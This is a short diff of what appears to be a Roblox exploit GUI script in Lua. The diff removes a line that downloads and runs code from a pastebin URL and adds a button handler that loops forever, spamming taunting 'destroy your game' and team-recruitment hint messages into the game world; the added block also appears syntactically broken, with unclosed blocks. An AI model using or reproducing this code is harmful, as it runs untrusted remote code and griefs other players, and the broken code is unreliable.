@@ -719,7 +719,16 @@ FASTHINT.TextScaled = true
 FASTHINT.TextSize = 14.000
 FASTHINT.TextWrapped = true
 FASTHINT.MouseButton1Down:connect(function()
-loadstring(game:HttpGet("https://pastebin.com/raw/KuDUPYkT"))()
+Disc0s.MouseButton1Down:connect(function()
+while true do
+local h = Instance.new("Hint")
+h.Text = "30$$£KLO √-AS De$TRo9 y0Ur GaMe!$!$!$"
+h.Parent = workspace
+wait(0.08)
+local h = Instance.new("Hint")
+h.Text = "Te4M J4l0 J01n T0d4y!$!$!$"
+h.Parent = workspace
+wait(0.08)
 end)
 
 -- Scripts :
